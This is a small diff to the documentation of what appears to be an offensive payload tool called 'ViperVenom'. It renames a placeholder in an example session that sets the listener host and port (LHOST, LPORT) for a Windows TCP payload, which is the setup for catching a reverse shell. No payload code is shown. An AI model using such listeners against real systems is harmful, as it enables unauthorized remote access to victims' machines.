@@ -163,10 +163,10 @@ After selecting payload, you must set up your host IP and port that you want to 
 ```
 EXAMPLE:
 
-Listener) Windows/ViperVenom/TCP/Payload > set host YOURIP
+Listener) Windows/ViperVenom/TCP/Payload > set host YOURLOCALIP
 (Listener) Windows/ViperVenom/TCP/Payload > set port YOURPORT
 (Listener) Windows/ViperVenom/TCP/Payload > show host
-LHOST=YOURIP
+LHOST=YOURLOCALIP
 (Listener) Windows/ViperVenom/TCP/Payload > show port
 LPORT=YOURPORT
 (Listener) Windows/ViperVenom/TCP/Payload > 
